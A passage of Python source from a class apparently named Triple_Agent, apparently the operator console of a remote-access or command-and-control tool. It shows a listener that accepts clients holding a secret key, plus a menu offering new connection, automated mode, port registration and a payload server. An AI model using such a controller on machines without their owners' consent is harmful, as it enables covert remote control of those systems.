                        if self.payload in self.key_secret:
                            i = i + 1
                            self.send(self.client_conn, "Connection accepted")
                            
                            print(f"\n\n [{i}] Connnected To - {self.client_addr} : {self.client_port} ")
                            self.autoservices(self.client_conn)

                    except Exception as e:
                        #print(f"establish_new_connect LOOP: {e}")
                        pass
        except socket.error as err:
            #print(f"establish_new_connect SOCKET: {e}")
            self.server_socket.close()
            pass
        except Exception as e:
            #print(f"establish_new_connect ERROR: {e}")
            #print(2, e)
            pass


    def main_menu(self):

        try:
            print("\n[bold red]============ MENU ================[/bold red]\n")
            
            i = 0
            for main_me in self.list_main_menu:
                i += 1
                if main_me != "Quit":
                    print(f"[[bold blue]{i}[/bold blue]] [bold white]{main_me}[bold white] ")
                else:
                    print(f"[[bold red]Q[/bold red]] [bold red]{main_me}[/bold red]")

            input_main_menu = self.console.input("\n[bold blue]Choose:[/bold blue] ")
            if input_main_menu.isnumeric() == True:
                m_mu = self.list_main_menu[int(input_main_menu)-1]

                self.cnnection_menu(m_mu)
            else:
                self.off()

        except Exception as e:
            self.main_menu()

        except KeyboardInterrupt:
            self._start()

    def cnnection_menu(self, main_menu):
        num_menu = self.list_main_menu.index(main_menu)
        if num_menu == 0:
            status_menu = self.new_connection()

        if num_menu == 1:
            status_menu = self.automated()


        if num_menu == 2:
            status_menu = self.register_port()
            if status_menu == True:
                self.main_menu()
        if num_menu == 3:
            status_menu = self.payload_server()



    def _clear(self):
        
        if platform =="win32":
            os.system('cls')
        else:
            os.system('clear')
        

    def _start(self):
        self._clear()
        self._version()
        self.main_menu()

#if __name__ == '__main__':
    #app = Triple_Agent()
    #app._start()
